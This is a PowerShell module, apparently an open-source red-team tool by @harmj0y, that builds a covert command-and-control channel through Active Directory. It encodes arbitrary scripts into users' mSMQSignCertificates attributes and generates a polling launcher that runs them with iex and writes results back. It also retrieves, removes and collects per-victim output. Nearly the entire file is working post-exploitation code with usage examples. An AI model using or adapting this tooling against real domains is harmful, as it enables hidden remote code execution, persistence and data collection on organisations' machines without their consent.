#Requires -Version 2

function New-ADPayload {
<#
    .SYNOPSIS

        Stores PowerShell logic in the mSMQSignCertificates of the specified -TriggerAccount and generates
        a one-line launcher.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Takes a script block or PowerShell .ps1 file, compresses the data using IO.Compression.DeflateStream,
        and stores the resulting bytes as a base64-encoded string in the mSMQSignCertificates field of the
        specified -TriggerAccount, defaulting to the current user. Also generates a one-line launcher that checks
        for data in mSMQSignCertificates of the specified user on a timed interval, executing logic if it exists
        and storing the results in mSMQSignCertificates for the current user.

    .PARAMETER ScriptBlock

        Script block to store in the mSMQSignCertificates field for the specified user.

    .PARAMETER Path

        Path of a PowerShell .ps1 script to store in the mSMQSignCertificates field for the specified user.

    .PARAMETER TriggerAccount

        The user account to store the compressed logic in, defaults to the current user ([Environment]::UserName).
        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').

    .PARAMETER SleepSeconds

        The number of seconds to sleep between checks for the mSMQSignCertificates property, default
        of 60 seconds.

    .EXAMPLE

        PS C:\> New-ADPayload -Path C:\Temp\malicious.ps1

        Store a malicious PowerShell script into the mSMQSignCertificates property for the current user and output
        the launcher code in a custom object.

    .EXAMPLE

        PS C:\> New-ADPayload -ScriptBlock {gci C:\} -Verbose

        Store the specified scriptblock into the mSMQSignCertificates property for the current user and output
        the launcher code in a custom object.

    .EXAMPLE

        PS C:\> {gci C:\} | New-ADPayload

        Store the specified scriptblock into the mSMQSignCertificates property for the current user and output
        the launcher code in a custom object.

    .EXAMPLE

        PS C:\> New-ADPayload -ScriptBlock {gci C:\Users\} -TriggerAccount mnelson -SleepSeconds 300 -Verbose

        Store the specified scriptblock into the mSMQSignCertificates property for 'mnelson' user and output
        the launcher code (utilizing a 5 minute sleep internval instead of 60 seconds) in a custom object.
#>
    [CmdletBinding(DefaultParameterSetName = 'ScriptBlock')]
    Param (
        [Parameter(ParameterSetName = 'ScriptBlock', Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(ParameterSetName = 'FilePath', Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('FilePath', 'FullName')]
        [String]
        $Path,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TriggerAccount = [Environment]::UserName,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Int]
        $SleepSeconds = 60
    )

    PROCESS {
        # get the raw bytes for the logic to store
        if($PSBoundParameters['Path']) {
            try {
                $Null = Get-ChildItem -Path $Path -ErrorAction Stop
                $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path -Path $Path))
            }
            catch {
                throw "Error reading byte from file: $Path"
            }
        }
        else {
            $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
        }

        # compress the data using DeflateStream
        $CompressedStream = New-Object IO.MemoryStream
        $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
        $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
        $DeflateStream.Dispose()
        $CompressedScriptBytes = $CompressedStream.ToArray()
        $CompressedStream.Dispose()
        $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

        $Searcher = [adsisearcher]''

        if($TriggerAccount.Contains(',')) {
            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
        }
        else {
            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
        }
        $Searcher.CacheResults = $False
        $User = $Searcher.FindOne()

        # grab the user object we're storing the trigger payload in
        if($User) {
            try {
                $UserEntry = $User.GetDirectoryEntry()
                $UserDN = $User.Properties.distinguishedname[0]
                $Null = $UserEntry.Put('mSMQSignCertificates', $EncodedCompressedScript)
                $Null = $UserEntry.SetInfo()
                Write-Verbose "Payload stored in 'mSMQSignCertificates' parameter for $UserDN"

                <#
                The expanded trigger logic:

                    sal a New-Object;
                    $DC=([ADSI]'LDAP://RootDSE').dnshostname;
                    $OC=''; # original command
                    while($True) {
                        Start-Sleep $SleepSeconds;
                        $S=[adsisearcher][adsi]"GC://$DC";
                        $S.Filter="(&(distinguishedname=$UserDN)(mSMQSignCertificates=*))";
                        $S.CacheResults=$False;
                        $U=$S.FindOne();

                        if(!$u){continue};

                        $C=[System.Text.Encoding]::ASCII.GetString($u.properties.msmqsigncertificates[0]);

                        # if there's a new tasking command
                        if($C -and ($C -ne '') -and ($C -ne $OC)){
                            $OC=$C;
                            # base64-decode/decompress the command and trigger it
                            $SB=([Text.Encoding]::ASCII).GetBytes($(iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($C),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-String));
                            $CS=a IO.MemoryStream;
                            # compress/base64-encde the results
                            $DS=a IO.Compression.DeflateStream($CS,[IO.Compression.CompressionMode]::Compress);
                            $DS.Write($SB,0,$SB.Length);$DS.Dispose();$CS.Dispose();$R2 = [Convert]::ToBase64String($CS.ToArray());
                            # current user
                            $CU=([adsisearcher]"(samaccountname=$([Environment]::UserName))").FindOne().GetDirectoryEntry();
                            # put the results in the current user's 'mSMQSignCertificates' field
                            $CU.Put('mSMQSignCertificates',$R2);$CU.SetInfo();
                        }
                    }
                #>

                $TriggerScript = "sal a New-Object;`$DC=([ADSI]'LDAP://RootDSE').dnshostname;`$OC='';while(`$True) {Start-Sleep $SleepSeconds;`$S=[adsisearcher][adsi]`"GC://`$DC`";`$S.Filter=`"(&(distinguishedname=$UserDN)(mSMQSignCertificates=*))`";`$S.CacheResults=`$False;`$U=`$S.FindOne();if(!`$u){continue};`$C=[System.Text.Encoding]::ASCII.GetString(`$u.properties.msmqsigncertificates[0]);if(`$C -and (`$C -ne '') -and (`$C -ne `$OC)){`$OC=`$C;`$SB=([Text.Encoding]::ASCII).GetBytes(`$(iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`$C),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-String));`$CS=a IO.MemoryStream;`$DS=a IO.Compression.DeflateStream(`$CS,[IO.Compression.CompressionMode]::Compress);`$DS.Write(`$SB,0,`$SB.Length);`$DS.Dispose();`$CS.Dispose();`$R2 = [Convert]::ToBase64String(`$CS.ToArray());`$CU=([adsisearcher]`"(samaccountname=`$([Environment]::UserName))`").FindOne().GetDirectoryEntry();`$CU.Put('mSMQSignCertificates',`$R2);`$CU.SetInfo();}}"

                New-Object -TypeName PSObject -Property @{
                    TriggerAccount = $UserDN
                    EncodedPayload = $EncodedCompressedScript
                    TriggerScript = $TriggerScript
                    SleepSeconds = $SleepSeconds
                }
            }
            catch {
                Write-Error "Error setting mSMQSignCertificates for samaccountname: '$TriggerAccount' : $_"
            }
        }
        else {
            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
        }
    }
}


function Get-ADPayload {
<#
    .SYNOPSIS

        Retrieves the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Retrieves the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount,
        base64-decodes and decompresses the logic, outputting everything as a custom PS object. For users in
        a foreign domain, use "user@domain.com" syntax.

    .PARAMETER TriggerAccount

        The user account to store the compressed logic in, defaults to the current user ([Environment]::UserName).
        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').

    .EXAMPLE

        PS C:\> Get-ADPayload

        TriggerAccount                Payload                       EncodedPayload
        --------------                -------                       --------------
        CN=harmj0y,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...

    .EXAMPLE

        PS C:\> Get-ADPayload -TriggerAccount mnelson

        TriggerAccount                Payload                       EncodedPayload
        --------------                -------                       --------------
        CN=mnelson,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...

    .EXAMPLE

        PS C:\> 'CN=harmj0y,CN=Users,DC=testlab,DC=local' | Get-ADPayload

        TriggerAccount                Payload                       EncodedPayload
        --------------                -------                       --------------
        CN=harmj0y,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...
#>
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TriggerAccount = [Environment]::UserName
    )

    PROCESS {

        if($PSBoundParameters['TriggerAccount']) {
            # get this machine's logon domain controller
            $GlobalCatalog = ([ADSI]'LDAP://RootDSE').dnshostname
            $Searcher = [adsisearcher][adsi]"GC://$GlobalCatalog"
            Write-Verbose "Using the global catalog at GC://$($GlobalCatalog)"
        }
        else {
            # if using the current user, just search the current domain
            $Searcher = [adsisearcher]''
        }

        if($TriggerAccount.Contains(',')) {
            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
        }
        else {
            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
        }
        $Searcher.CacheResults = $False
        $User = $Searcher.FindOne()

        if($User) {
            try {
                if($User.properties.msmqsigncertificates) {
                    $RawCommand = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])

                    $Payload = (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($RawCommand),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

                    New-Object -TypeName PSObject -Property @{
                        TriggerAccount = $User.properties.distinguishedname[0]
                        EncodedPayload = $RawCommand
                        Payload = $Payload
                    }
                }
                else {
                    Write-Verbose "No payload stored for $TriggerAccount"
                }
            }
            catch {
                Write-Error "Error retrieving mSMQSignCertificates for samaccountname '$TriggerAccount' : $_"
            }
        }
        else {
            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
        }
    }
}


function Remove-ADPayload {
<#
    .SYNOPSIS

        Removes the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Removes the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.

    .PARAMETER TriggerAccount

        The user account to store the remove the trigger from, defaults to the current user ([Environment]::UserName).
        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').

    .EXAMPLE

        PS C:\> Remove-ADPayload

        Removes the payload stored for the current user.

    .EXAMPLE

        PS C:\> Remove-ADPayload -TriggerAccount mnelson

        Removes the payload stored for the 'mnelson' user.

    .EXAMPLE

        PS C:\> $Payload = Get-ADPayload
        PS C:\> $Payload | Remove-ADPayload

        Retrieve the AD payload for the current user and then remove it.

    .EXAMPLE

        PS C:\> $Payload = {gci C:\} | New-ADPayload
        PS C:\> $Payload | Remove-ADPayload

        Create a new AD payload and then remove it.
#>
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('cn', 'username')]
        [String]
        $TriggerAccount = [Environment]::UserName
    )

    PROCESS {

        $Searcher = [adsisearcher]''

        if($TriggerAccount.Contains(',')) {
            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
        }
        else {
            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
        }
        $Searcher.CacheResults = $False
        $User = $Searcher.FindOne()

        if($User) {
            try {
                $UserEntry = $User.GetDirectoryEntry()

                # weird way to clear the entry
                $UserEntry.PutEx(1, 'mSMQSignCertificates', 0)

                $UserEntry.SetInfo()

                Write-Verbose "Removed mSMQSignCertificates property for '$($User.properties.distinguishedname[0])"
            }
            catch {
                Write-Error "Error retrieving mSMQSignCertificates for samaccountname '$($User.properties.distinguishedname[0])' : $_"
            }
        }
        else {
            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
        }
    }
}


function Get-ADPayloadResult {
<#
    .SYNOPSIS

        Retrieves the results of any clients who executed the broadcast logic from New-ADPayload.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Queries all users EXCEPT the -TriggerAccount used to broadcast the script logic (default of [Environment]::UserName),
        extracts out the compressed logic and displays the per-user results. If a -TriggerAccount value is specified,
        the global catalog is searched for all results (instead of just the current domain)/

    .PARAMETER TriggerAccount

        The user account used to store the broadcast trigger, defaults to the current user.
        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').

    .EXAMPLE

        PS C:\> Get-ADPayloadResult | fl

        TriggerAccount : harmj0y
        Results        :

                            Directory: C:\


                        Mode                LastWriteTime     Length Name

                        ----                -------------     ------ ----

                        d----         7/13/2009   8:20 PM            PerfLogs

                        d-r--          8/9/2016  11:07 AM            Program Files

                        d-r--         7/13/2009  10:08 PM            Program Files (x86)

                        d-r--         8/12/2016  11:49 AM            Users

                        d----          8/9/2016  11:48 AM            Windows

        VictimAccount  : CN=Justin Warner,CN=Users,DC=testlab,DC=local


        Gathers results from all users (except the current user) with mSMQSignCertificates set.

    .EXAMPLE

        PS C:\> Get-ADPayloadResult -Verbose -TriggerAccount harmj0y
        VERBOSE: Using the global catalog at GC://PRIMARY.testlab.local

        TriggerAccount                Results                       VictimAccount
        --------------                -------                       -------------
        harmj0y                       ...                           CN=Justin Warner,CN=Users,...
        harmj0y                       ...                           CN=user1,CN=Users,DC=dev,D...


        Gathers results from all users (except 'harmj0y') with mSMQSignCertificates set by searching the
        global catalog.
#>
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TriggerAccount = [Environment]::UserName
    )

    PROCESS {

        if($PSBoundParameters['TriggerAccount']) {
            # get this machine's logon domain controller
            $GlobalCatalog = ([ADSI]'LDAP://RootDSE').dnshostname
            $Searcher = [adsisearcher][adsi]"GC://$GlobalCatalog"
            Write-Verbose "Using the global catalog at GC://$($GlobalCatalog)"
        }
        else {
            # if using the current user, just search the current domain
            $Searcher = [adsisearcher]''
        }

        if($TriggerAccount.Contains(',')) {
            $Searcher.Filter = "(&(!distinguishedname=$TriggerAccount)(mSMQSignCertificates=*))"
        }
        else {
            $Searcher.Filter = "(&(!samaccountname=$TriggerAccount)(mSMQSignCertificates=*))"
        }
        $Searcher.CacheResults = $False

        ForEach($User in $Searcher.FindAll()) {
            try {
                $Raw = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])
                $Results = (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($([System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0]))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

                New-Object -TypeName PSObject -Property @{
                    TriggerAccount = $TriggerAccount
                    VictimAccount = $User.properties.distinguishedname[0]
                    Results = $Results
                }
            }
            catch {
                Write-Error "Error retrieving results from 'mSMQSignCertificates': $_"
            }
        }
    }
}
